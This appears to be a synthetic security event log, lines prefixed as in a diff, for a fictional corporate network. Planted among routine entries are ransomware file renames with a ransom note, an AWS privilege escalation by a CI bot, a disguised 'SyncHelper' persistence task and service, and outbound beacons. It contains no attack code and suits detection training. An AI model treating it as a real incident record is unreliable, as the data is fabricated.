+EVT-00349,2026-11-02 14:40:44,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_000.docx,Success,Informational
+EVT-00350,2026-11-02 14:40:47,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_001.docx,Success,Informational
+EVT-00351,2026-11-02 14:40:50,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_002.docx,Success,Informational
+EVT-00352,2026-11-02 14:40:54,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_003.docx,Success,Informational
+EVT-00353,2026-11-02 14:40:58,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_004.docx,Success,Informational
+EVT-00354,2026-11-02 14:41:01,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_005.docx,Success,Informational
+EVT-00355,2026-11-02 14:41:04,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_006.docx,Success,Informational
+EVT-00356,2026-11-02 14:41:08,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_007.docx,Success,Informational
+EVT-00357,2026-11-02 14:41:11,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_008.docx,Success,Informational
+EVT-00358,2026-11-02 14:41:15,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_009.docx,Success,Informational
+EVT-00359,2026-11-02 14:41:18,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_010.docx,Success,Informational
+EVT-00360,2026-11-02 14:41:21,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_011.docx,Success,Informational
+EVT-00361,2026-11-02 14:41:24,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_012.docx,Success,Informational
+EVT-00362,2026-11-02 14:41:26,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_013.docx,Success,Informational
+EVT-00363,2026-11-02 14:41:30,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_014.docx,Success,Informational
+EVT-00364,2026-11-02 14:41:34,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_015.docx,Success,Informational
+EVT-00365,2026-11-02 14:41:36,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_016.docx,Success,Informational
+EVT-00366,2026-11-02 14:41:39,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_017.docx,Success,Informational
+EVT-00367,2026-11-02 14:41:42,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_018.docx,Success,Informational
+EVT-00368,2026-11-02 14:41:44,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_019.docx,Success,Informational
+EVT-00369,2026-11-02 14:41:46,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_020.docx,Success,Informational
+EVT-00370,2026-11-02 14:41:50,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_021.docx,Success,Informational
+EVT-00371,2026-11-02 14:41:52,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_022.docx,Success,Informational
+EVT-00372,2026-11-02 14:41:55,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_023.docx,Success,Informational
+EVT-00373,2026-11-02 14:41:59,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_024.docx,Success,Informational
+EVT-00374,2026-11-02 14:42:01,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_025.docx,Success,Informational
+EVT-00375,2026-11-02 14:42:04,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_026.docx,Success,Informational
+EVT-00376,2026-11-02 14:42:07,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_027.docx,Success,Informational
+EVT-00377,2026-11-02 14:42:11,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_028.docx,Success,Informational
+EVT-00378,2026-11-02 14:42:15,FS-SRV01,4663,CORP\mflores,10.20.4.109,\\FS-SRV01\Shared,Security,An attempt was made to access an object,File access: Shared\Operaciones\document_029.docx,Success,Informational
+EVT-00379,2026-11-02 14:42:33,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00380,2026-11-02 14:43:18,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_00.docx.locked,,Success,Warning
+EVT-00381,2026-11-02 14:43:20,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_01.docx.locked,,Success,Warning
+EVT-00382,2026-11-02 14:43:23,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_02.docx.locked,,Success,Warning
+EVT-00383,2026-11-02 14:43:26,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_03.docx.locked,,Success,Warning
+EVT-00384,2026-11-02 14:43:28,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_04.docx.locked,,Success,Warning
+EVT-00385,2026-11-02 14:43:30,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_05.docx.locked,,Success,Warning
+EVT-00386,2026-11-02 14:43:32,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_06.docx.locked,,Success,Warning
+EVT-00387,2026-11-02 14:43:34,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_07.docx.locked,,Success,Warning
+EVT-00388,2026-11-02 14:43:36,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_08.docx.locked,,Success,Warning
+EVT-00389,2026-11-02 14:43:39,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_09.docx.locked,,Success,Warning
+EVT-00390,2026-11-02 14:43:42,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_10.docx.locked,,Success,Warning
+EVT-00391,2026-11-02 14:43:45,WS-109,FILE_ENCRYPT,mflores,10.20.4.109,,EDR,File renamed to C:\Users\mflores\Documents\informe_11.docx.locked,,Success,Warning
+EVT-00392,2026-11-02 14:43:55,WS-109,FILE_CREATE,mflores,10.20.4.109,,EDR,File created: C:\Users\mflores\Desktop\HOW_TO_DECRYPT.txt (ransom note),,Success,Warning
+EVT-00393,2026-11-02 14:44:18,APP-SRV02,4624,CORP\jrivas,10.20.5.103,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00394,2026-11-02 14:47:39,WS-108,4688,CORP\cmolina,10.20.4.108,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00395,2026-11-02 14:49:36,APP-SRV02,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00396,2026-11-02 14:55:43,FS-SRV01,5140,CORP\tparedes,10.20.5.109,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00397,2026-11-02 14:56:34,FS-SRV01,7036,SYSTEM,10.20.1.10,,System,Service entered running state,,Success,Informational
+EVT-00398,2026-11-02 14:57:24,APP-SRV02,4624,CORP\dsosa,10.20.4.105,DB-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00399,2026-11-02 14:58:55,DC-01,4625,CORP\bacosta,10.20.5.112,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00400,2026-11-02 14:59:08,FS-SRV01,4624,CORP\rvega,10.20.3.107,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00401,2026-11-02 14:59:12,FS-SRV01,5140,CORP\agomez,10.20.5.106,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00402,2026-11-02 14:59:32,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00403,2026-11-02 15:00:34,APP-SRV02,4634,CORP\cmolina,10.20.4.108,,Security,An account was logged off,,Success,Informational
+EVT-00404,2026-11-02 15:03:33,FS-SRV01,5140,CORP\lcastro,10.20.3.101,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00405,2026-11-02 15:04:05,DB-SRV02,4634,CORP\bacosta,10.20.5.112,,Security,An account was logged off,,Success,Informational
+EVT-00406,2026-11-02 15:04:24,DB-SRV02,4634,CORP\cmolina,10.20.4.108,,Security,An account was logged off,,Success,Informational
+EVT-00407,2026-11-02 15:09:49,WEB-02,HTTP_ACCESS,-,10.20.5.109,WEB-02:443,IIS,HTTP request,/css/site.css,200,Informational
+EVT-00408,2026-11-02 15:10:42,WS-112,4688,CORP\bacosta,10.20.5.112,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00409,2026-11-02 15:11:07,WS-103,4688,CORP\jrivas,10.20.5.103,,Security,A new process has been created,winword.exe,Success,Informational
+EVT-00410,2026-11-02 15:11:55,FS-SRV01,4624,CORP\bacosta,10.20.5.112,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00411,2026-11-02 15:11:55,WS-106,4688,CORP\agomez,10.20.5.106,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00412,2026-11-02 15:13:22,APP-SRV02,4634,CORP\fsuarez,10.20.4.111,,Security,An account was logged off,,Success,Informational
+EVT-00413,2026-11-02 15:15:34,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00414,2026-11-02 15:15:56,DB-SRV02,4624,CORP\tparedes,10.20.5.109,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00415,2026-11-02 15:16:56,FS-SRV01,5140,CORP\rvega,10.20.3.107,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00416,2026-11-02 15:17:15,DB-SRV02,7036,SYSTEM,10.20.1.50,,System,Service entered running state,,Success,Informational
+EVT-00417,2026-11-02 15:22:26,FS-SRV01,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00418,2026-11-02 15:23:20,WS-106,dns_query,agomez,10.20.5.106,10.20.1.10,DNS,A query www.google.com,,Success,Informational
+EVT-00419,2026-11-02 15:24:30,WS-106,4688,CORP\agomez,10.20.5.106,,Security,A new process has been created,excel.exe,Success,Informational
+EVT-00420,2026-11-02 15:26:51,WS-105,4688,CORP\dsosa,10.20.4.105,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00421,2026-11-02 15:29:02,WS-110,PROXY_ACCESS,CORP\nibarra,10.20.3.110,192.0.2.50:443,Proxy,HTTPS GET outbound,bytes_out=4123 uri=/mt399j,Allowed,Informational
+EVT-00422,2026-11-02 15:29:12,DC-01,4634,CORP\nibarra,10.20.3.110,,Security,An account was logged off,,Success,Informational
+EVT-00423,2026-11-02 15:30:31,APP-SRV02,4624,CORP\cmolina,10.20.4.108,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00424,2026-11-02 15:31:18,aws-account-prod,ListBuckets,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call ListBuckets: AccessDenied,,AccessDenied,Informational
+EVT-00425,2026-11-02 15:31:21,WEB-02,4624,CORP\bacosta,10.20.5.112,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00426,2026-11-02 15:31:30,aws-account-prod,GetSecretValue,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call GetSecretValue: AccessDenied,,AccessDenied,Informational
+EVT-00427,2026-11-02 15:31:53,aws-account-prod,DescribeInstances,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call DescribeInstances: AccessDenied,,AccessDenied,Informational
+EVT-00428,2026-11-02 15:32:07,aws-account-prod,ListUsers,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call ListUsers: AccessDenied,,AccessDenied,Informational
+EVT-00429,2026-11-02 15:32:26,aws-account-prod,GetSecretValue,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call GetSecretValue: AccessDenied,,AccessDenied,Informational
+EVT-00430,2026-11-02 15:33:06,aws-account-prod,CreateAccessKey,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call CreateAccessKey for user backup-admin,,Success,Informational
+EVT-00431,2026-11-02 15:33:36,aws-account-prod,AttachUserPolicy,ci-deploy-bot,203.0.113.250,us-east-1,CloudTrail,AWS API call AttachUserPolicy: AdministratorAccess to backup-admin,,Success,Informational
+EVT-00432,2026-11-02 15:36:30,APP-SRV02,4624,CORP\cmolina,10.20.4.108,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00433,2026-11-02 15:36:46,DC-01,4625,CORP\cmolina,10.20.4.108,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00434,2026-11-02 15:40:27,FS-SRV01,5140,CORP\jrivas,10.20.5.103,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00435,2026-11-02 15:42:46,WEB-02,7036,SYSTEM,10.20.1.50,,System,Service entered running state,,Success,Informational
+EVT-00436,2026-11-02 15:46:03,FS-SRV01,5140,CORP\fsuarez,10.20.4.111,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00437,2026-11-02 15:52:05,DC-01,4624,CORP\tparedes,10.20.5.109,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00438,2026-11-02 15:52:30,APP-SRV02,4624,CORP\lcastro,10.20.3.101,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00439,2026-11-02 15:54:24,WS-106,dns_query,agomez,10.20.5.106,10.20.1.10,DNS,A query www.slack.com,,Success,Informational
+EVT-00440,2026-11-02 15:54:53,WEB-02,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00441,2026-11-02 15:56:43,WS-112,dns_query,bacosta,10.20.5.112,10.20.1.10,DNS,A query www.github.com,,Success,Informational
+EVT-00442,2026-11-02 16:01:36,WS-109,dns_query,tparedes,10.20.5.109,10.20.1.10,DNS,A query www.windowsupdate.com,,Success,Informational
+EVT-00443,2026-11-02 16:06:48,WEB-02,HTTP_ACCESS,-,10.20.4.108,WEB-02:443,IIS,HTTP request,/index.html,200,Informational
+EVT-00444,2026-11-02 16:08:00,APP-SRV02,4698,CORP\rvega,10.20.3.107,,Security,A scheduled task was created,TaskName=\Microsoft\Windows\SyncHelper; Action=powershell.exe -File C:\ProgramData\synchelper.ps1,Success,Warning
+EVT-00445,2026-11-02 16:08:45,FS-SRV01,4634,CORP\bacosta,10.20.5.112,,Security,An account was logged off,,Success,Informational
+EVT-00446,2026-11-02 16:09:00,APP-SRV02,7045,CORP\rvega,10.20.3.107,,System,A service was installed in the system,ServiceName=SyncHelperSvc; ImagePath=C:\ProgramData\synchelper.exe,Success,Warning
+EVT-00447,2026-11-02 16:09:25,APP-SRV02,4624,CORP\agomez,10.20.5.106,APP-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00448,2026-11-02 16:11:12,WS-111,dns_query,fsuarez,10.20.4.111,10.20.1.10,DNS,A query www.office365.com,,Success,Informational
+EVT-00449,2026-11-02 16:13:32,FS-SRV01,7036,SYSTEM,10.20.2.40,,System,Service entered running state,,Success,Informational
+EVT-00450,2026-11-02 16:15:00,APP-SRV02,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,C:\ProgramData\synchelper.exe,Success,Informational
+EVT-00451,2026-11-02 16:21:00,APP-SRV02,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,C:\ProgramData\synchelper.exe,Success,Informational
+EVT-00452,2026-11-02 16:21:20,WS-112,4688,CORP\bacosta,10.20.5.112,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00453,2026-11-02 16:21:52,FS-SRV01,4634,CORP\lcastro,10.20.3.101,,Security,An account was logged off,,Success,Informational
+EVT-00454,2026-11-02 16:25:24,WEB-02,HTTP_ACCESS,-,10.20.3.104,WEB-02:443,IIS,HTTP request,/css/site.css,200,Informational
+EVT-00455,2026-11-02 16:26:17,WEB-02,HTTP_ACCESS,-,10.20.3.110,WEB-02:443,IIS,HTTP request,/index.html,200,Informational
+EVT-00456,2026-11-02 16:26:36,DC-01,7036,SYSTEM,10.20.1.30,,System,Service entered running state,,Success,Informational
+EVT-00457,2026-11-02 16:27:00,APP-SRV02,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,C:\ProgramData\synchelper.exe,Success,Informational
+EVT-00458,2026-11-02 16:31:25,DB-SRV02,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00459,2026-11-02 16:31:41,DC-01,4624,CORP\fsuarez,10.20.4.111,DC-01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00460,2026-11-02 16:33:00,APP-SRV02,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,C:\ProgramData\synchelper.exe,Success,Informational
+EVT-00461,2026-11-02 16:33:05,WS-103,PROXY_ACCESS,CORP\jrivas,10.20.5.103,203.0.113.142:443,Proxy,HTTPS GET outbound,bytes_out=2247 uri=/zebye6,Allowed,Informational
+EVT-00462,2026-11-02 16:36:23,WS-107,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,excel.exe,Success,Informational
+EVT-00463,2026-11-02 16:37:54,DB-SRV02,4634,CORP\nibarra,10.20.3.110,,Security,An account was logged off,,Success,Informational
+EVT-00464,2026-11-02 16:39:56,DC-01,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00465,2026-11-02 16:40:05,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,onedrive.exe,Success,Informational
+EVT-00466,2026-11-02 16:40:38,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00467,2026-11-02 16:40:54,APP-SRV02,7036,SYSTEM,10.20.2.40,,System,Service entered running state,,Success,Informational
+EVT-00468,2026-11-02 16:44:08,WS-103,4688,CORP\jrivas,10.20.5.103,,Security,A new process has been created,excel.exe,Success,Informational
+EVT-00469,2026-11-02 16:49:03,DB-SRV02,4624,CORP\dsosa,10.20.4.105,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00470,2026-11-02 16:51:11,DC-01,4625,CORP\jrivas,10.20.5.103,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00471,2026-11-02 16:51:49,WEB-02,7036,SYSTEM,10.20.1.50,,System,Service entered running state,,Success,Informational
+EVT-00472,2026-11-02 16:54:53,APP-SRV02,4624,CORP\nibarra,10.20.3.110,DC-01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00473,2026-11-02 16:57:12,DB-SRV02,4624,CORP\mflores,10.20.4.109,FS-SRV01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00474,2026-11-02 17:01:08,WEB-02,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00475,2026-11-02 17:06:16,WS-105,dns_query,dsosa,10.20.4.105,10.20.1.10,DNS,A query www.google.com,,Success,Informational
+EVT-00476,2026-11-02 17:06:55,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00477,2026-11-02 17:09:18,APP-SRV02,7036,SYSTEM,10.20.1.30,,System,Service entered running state,,Success,Informational
+EVT-00478,2026-11-02 17:13:09,WS-107,PROXY_ACCESS,CORP\rvega,10.20.3.107,203.0.113.142:443,Proxy,HTTPS GET outbound,bytes_out=8046 uri=/nqvw5z,Allowed,Informational
+EVT-00479,2026-11-02 17:14:31,WEB-02,4624,CORP\dsosa,10.20.4.105,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00480,2026-11-02 17:15:40,DB-SRV02,4624,CORP\cmolina,10.20.4.108,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00481,2026-11-02 17:17:19,FS-SRV01,4634,CORP\jrivas,10.20.5.103,,Security,An account was logged off,,Success,Informational
+EVT-00482,2026-11-02 17:20:33,WS-107,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00483,2026-11-02 17:21:23,FS-SRV01,7036,SYSTEM,10.20.1.30,,System,Service entered running state,,Success,Informational
+EVT-00484,2026-11-02 17:21:31,LNX-APP01,ssh_login,deploy,10.20.5.10,10.20.5.15,Auth,Accepted publickey for deploy,,success,Informational
+EVT-00485,2026-11-02 17:21:35,WEB-02,4634,CORP\rvega,10.20.3.107,,Security,An account was logged off,,Success,Informational
+EVT-00486,2026-11-02 17:22:36,FS-SRV01,4624,CORP\fsuarez,10.20.4.111,FS-SRV01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00487,2026-11-02 17:25:26,FS-SRV01,5140,CORP\cmolina,10.20.4.108,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00488,2026-11-02 17:27:49,WEB-02,4624,CORP\lcastro,10.20.3.101,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00489,2026-11-02 17:29:22,WEB-02,HTTP_ACCESS,-,10.20.5.109,WEB-02:443,IIS,HTTP request,/,200,Informational
+EVT-00490,2026-11-02 17:32:51,WS-106,4688,CORP\agomez,10.20.5.106,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00491,2026-11-02 17:34:28,DC-01,4634,CORP\jrivas,10.20.5.103,,Security,An account was logged off,,Success,Informational
+EVT-00492,2026-11-02 17:34:48,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00493,2026-11-02 17:36:51,APP-SRV02,4634,CORP\nibarra,10.20.3.110,,Security,An account was logged off,,Success,Informational
+EVT-00494,2026-11-02 17:40:11,MAIL-GW01,EMAIL_DELIVERED,bacosta@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment agenda.docx,,Success,Informational
+EVT-00495,2026-11-02 17:41:26,FS-SRV01,5140,CORP\lcastro,10.20.3.101,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00496,2026-11-02 17:43:15,FS-SRV01,4624,CORP\mflores,10.20.4.109,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00497,2026-11-02 17:45:20,WEB-02,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00498,2026-11-02 17:45:24,FS-SRV01,5140,CORP\dsosa,10.20.4.105,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00499,2026-11-02 17:46:43,APP-SRV02,4624,CORP\agomez,10.20.5.106,DB-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00500,2026-11-02 17:47:56,APP-SRV02,4624,CORP\bacosta,10.20.5.112,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
